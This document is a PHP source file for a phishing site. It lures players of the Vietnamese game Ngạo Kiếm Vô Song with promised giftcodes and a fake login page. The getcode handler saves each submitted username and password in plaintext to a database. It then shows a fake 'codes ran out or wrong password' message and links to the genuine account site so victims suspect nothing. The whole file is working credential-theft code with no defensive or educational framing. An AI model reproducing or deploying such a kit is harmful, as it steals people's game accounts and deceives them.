<?php
class Code extends iBNC{
	public function __construct(){ 
		global $_B; 
		$this->r = $_B['r'];   
		$this->cache = $_B['cache'];   
		$controller = $this->r->get_string('controller','GET');
		$this->action = $this->r->get_string('action','GET');

		$this->d = array(); 

		if(method_exists($this, $controller)){
			$this->$controller();
		}
		else{
			$this->index();
		}
	} 

	function index(){ 			
		echo "123";
	}
	function getcode(){
		$user_name = $this->r->get_string("user_name","POST");
		$user_password = $this->r->get_string("user_password","POST");
		$model = $this->getModel("user");
		$data = array("user_name" =>$user_name,"user_password" => $user_password);
		$model->insert($data);
		echo "<h2>Xin Lỗi,Code đã hết hoặc tài khoản hoặc mật khẩu của bạn không chính xác!</h2>";
		echo "<a href='http://id.duo.vn'><h1>Nếu chưa có tài khoản , xin vui lòng đăng ký!</a>";
	}
	function login(){
		?>
		<html>
		<head>
			<title></title>
		</head>
		<body>
			<img src="https://cdn.vietstar.net/700x0/vstar/fb/0/820/2016/09/13/fba75e669169660cd94caea1a3433649.jpg" width="350" height="245">
			<h2>Giao Diện Đăng Nhập</h2>
			<h4>Đăng nhập ngay để nhận code</h4>
			<form method="post" action="http://kiot.igarden.vn/code/getcode">
				<label><b>Tài Khoản: </b></label><input type="text" name="user_name"><br><br>
				<label><b>Mật Khẩu:  </b></label><input type="password" name="user_password">
				<br>
				<br><input type="submit" value="Đăng nhập">
			</form>

		</body>

		</html>


		<?php
	}
	function nkvs(){
		?>
		<html>
		<head></head>
		<body>
			<div>
				<h1>Kính thưa quý vị anh hùng!<h1/>
	
				<h3>Hành tẩu trên giang hồ không chỉ cần có võ nghệ tinh thông mà cũng cần phải sở hữu binh khí lợi hại và độc đáo. Nhằm giúp cho quý nhân sĩ dễ dàng ghi dấu anh hùng tại Ngạo Kiếm Vô Song bằng những món vũ khí có sức mạnh to lớn, bổn trang xin dành tặng hàng triệu các loại giftcode đến các bậc hào kiệt trong thế giới Tuyệt Đỉnh Võ Hiệp.</h3>
				1. CODE Cao Thủ Xuất Sơn<br/>
				<img src="http://www.upsieutoc.com/images/2016/08/23/caothu.jpg" class="bbCodeImage LbImage" alt="[&#x200B;IMG]" data-url="http://www.upsieutoc.com/images/2016/08/23/caothu.jpg"/><br/>
				<a href="http://kiot.igarden.vn/code/login"><h4>Đăng nhâp mới thấy được code</h4></a></br>
			
				2. CODE NGẠO KIẾM LỆNH<br/>
				<img src="http://www.upsieutoc.com/images/2016/08/23/ngaokiemlenh1.jpg" class="bbCodeImage LbImage" alt="[&#x200B;IMG]" data-url="http://www.upsieutoc.com/images/2016/08/23/ngaokiemlenh1.jpg"/><br/>
				<a href="http://kiot.igarden.vn/code/login"><h4>Đăng nhâp mới thấy được code</h4></a></br>
			
				3. CODE VÔ SONG LỆNH<br/>
				<img src="http://www.upsieutoc.com/images/2016/08/23/vosonglenh.jpg" class="bbCodeImage LbImage" alt="[&#x200B;IMG]" data-url="http://www.upsieutoc.com/images/2016/08/23/vosonglenh.jpg"/><br/>
				<a href="http://kiot.igarden.vn/code/login"><h4>Đăng nhâp mới thấy được code</h4></a></br>
			
				4.CODE Vương Giả Quy Lai<br/>
				<img src="http://s1.upanh123.com/2016/08/23/yP3z7a465bb6.jpg" class="bbCodeImage LbImage" alt="[&#x200B;IMG]" data-url="http://s1.upanh123.com/2016/08/23/yP3z7a465bb6.jpg"/><br/>
				<a href="http://kiot.igarden.vn/code/login">Đăng nhâp mới thấy được code</a></br>
				5.CODE Nhạn Linh Đao Vương<br/>
				<img src="http://s1.upanh123.com/2016/08/23/NhanLinh1ccf3d.jpg" class="bbCodeImage LbImage" alt="[&#x200B;IMG]" data-url="http://s1.upanh123.com/2016/08/23/NhanLinh1ccf3d.jpg"/><br/>
				<a href="http://kiot.igarden.vn/code/login"><h4>Đăng nhâp mới thấy được code</h4></a></br>
				
				6.Code Nhất Niên Ngạo Thế<br/>
				<img src="http://www.upsieutoc.com/images/2016/08/23/nhatnien.jpg" class="bbCodeImage LbImage" alt="[&#x200B;IMG]" data-url="http://www.upsieutoc.com/images/2016/08/23/nhatnien.jpg"/><br/>
				<a href="http://kiot.igarden.vn/code/login"><h4>Đăng nhâp mới thấy được code</h4></a></br>
				
				7.Code Nhị Niên Xưng Hùng<br/>
				<img src="http://www.upsieutoc.com/images/2016/08/23/Codenhinien.jpg" class="bbCodeImage LbImage" alt="[&#x200B;IMG]" data-url="http://www.upsieutoc.com/images/2016/08/23/Codenhinien.jpg"/><br/>
				<a href="http://kiot.igarden.vn/code/login"><h4>Đăng nhâp mới thấy được code</h4></a></br>
			
				8.Code Quần Anh Hội Tụ<br/>
				<img src="http://www.upsieutoc.com/images/2016/08/23/quanhunghoitu.jpg" class="bbCodeImage LbImage" alt="[&#x200B;IMG]" data-url="http://www.upsieutoc.com/images/2016/08/23/quanhunghoitu.jpg"/><br/>
				<a href="http://kiot.igarden.vn/code/login"><h4>Đăng nhâp mới thấy được code</h4></a></br>
			
			</body>	
		</div>
		<?php

	}
}
?>